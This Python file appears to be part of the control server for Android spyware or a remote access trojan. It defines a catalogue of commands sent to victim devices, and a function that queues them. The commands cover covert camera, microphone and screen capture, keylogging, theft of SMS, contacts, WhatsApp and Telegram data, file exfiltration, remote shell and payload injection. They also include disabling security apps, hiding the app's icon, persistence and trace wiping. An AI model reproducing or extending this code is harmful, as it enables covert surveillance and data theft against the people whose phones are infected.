"""Command catalogue + builder."""

import json
from models import db, Command

COMMAND_CATALOG = {
    # Recon
    "device_info":       {"desc": "Full device fingerprint",       "args": []},
    "list_apps":         {"desc": "Installed applications",         "args": ["system_only:bool"]},
    "list_permissions":  {"desc": "Granted permissions per app",    "args": ["package"]},
    "running_processes": {"desc": "Live process list",              "args": []},
    "network_info":      {"desc": "WiFi/cellular details",          "args": []},
    "location":          {"desc": "GPS + network location",         "args": ["high_accuracy:bool"]},

    # Surveillance
    "screenshot":        {"desc": "Capture current screen",         "args": []},
    "camera_photo":      {"desc": "Take photo (front/back)",        "args": ["camera:str", "quality:int"]},
    "camera_stream":     {"desc": "Live camera stream",             "args": ["camera:str", "duration:int"]},
    "mic_record":        {"desc": "Record microphone",              "args": ["duration:int"]},
    "screen_record":     {"desc": "Record screen video",            "args": ["duration:int", "resolution:str"]},
    "keylog_start":      {"desc": "Start accessibility keylogger",  "args": []},
    "keylog_stop":       {"desc": "Stop keylogger",                 "args": []},
    "keylog_dump":       {"desc": "Dump captured keystrokes",       "args": []},

    # Comms
    "sms_list":          {"desc": "Read SMS inbox",                 "args": ["limit:int"]},
    "sms_send":          {"desc": "Send SMS",                       "args": ["number", "text"]},
    "call_log":          {"desc": "Read call history",              "args": ["limit:int"]},
    "call_make":         {"desc": "Initiate call",                  "args": ["number"]},
    "contacts":          {"desc": "Extract contacts",               "args": []},
    "whatsapp_dump":     {"desc": "Dump WhatsApp messages",         "args": []},
    "telegram_dump":     {"desc": "Dump Telegram messages",         "args": []},
    "notifications":     {"desc": "Capture notifications stream",   "args": ["duration:int"]},

    # Files
    "list_dir":          {"desc": "List directory contents",        "args": ["path"]},
    "download_file":     {"desc": "Exfiltrate file",                "args": ["path"]},
    "upload_file":       {"desc": "Push file to device",            "args": ["remote_path"]},
    "delete_file":       {"desc": "Delete file",                    "args": ["path"]},
    "search_files":      {"desc": "Grep-like search",               "args": ["path", "pattern", "ext"]},
    "dump_whatsapp_db":  {"desc": "Copy WhatsApp msgstore.db",      "args": []},
    "dump_gallery":      {"desc": "Exfiltrate gallery images",      "args": ["limit:int"]},

    # Execution
    "shell":             {"desc": "Execute shell command",          "args": ["cmd"]},
    "open_url":          {"desc": "Launch URL in browser",          "args": ["url"]},
    "install_apk":       {"desc": "Install secondary APK",          "args": ["path"]},
    "run_script":        {"desc": "Execute Luau/python script",     "args": ["lang", "code"]},
    "inject_payload":    {"desc": "Load DEX into running app",      "args": ["package", "dex_path"]},

    # Control
    "lock_screen":       {"desc": "Lock the device",                "args": []},
    "unlock_attempt":    {"desc": "Attempt PIN unlock",             "args": ["pin"]},
    "vibrate":           {"desc": "Vibrate",                        "args": ["ms"]},
    "toast":             {"desc": "Show toast message",             "args": ["text"]},
    "open_app":          {"desc": "Launch app by package",          "args": ["package"]},
    "kill_app":          {"desc": "Force-stop app",                 "args": ["package"]},
    "disable_av":        {"desc": "Disable security apps",          "args": []},

    # Persistence
    "persist":           {"desc": "Reinstall persistence hooks",    "args": ["method:str"]},
    "hide_icon":         {"desc": "Hide launcher icon",             "args": []},
    "set_wakelock":      {"desc": "Acquire wake lock",              "args": ["ms"]},
    "self_destruct":     {"desc": "Wipe agent and traces",          "args": ["confirm:bool"]},
}


def build_command(device, command_type: str, args: dict = None):
    if command_type not in COMMAND_CATALOG:
        raise ValueError(f"Unknown command: {command_type}")
    args = args or {}
    cmd = Command(
        device_id=device.id,
        command_type=command_type,
        payload=json.dumps(args),
        status="pending",
    )
    db.session.add(cmd)
    db.session.commit()
    return cmd
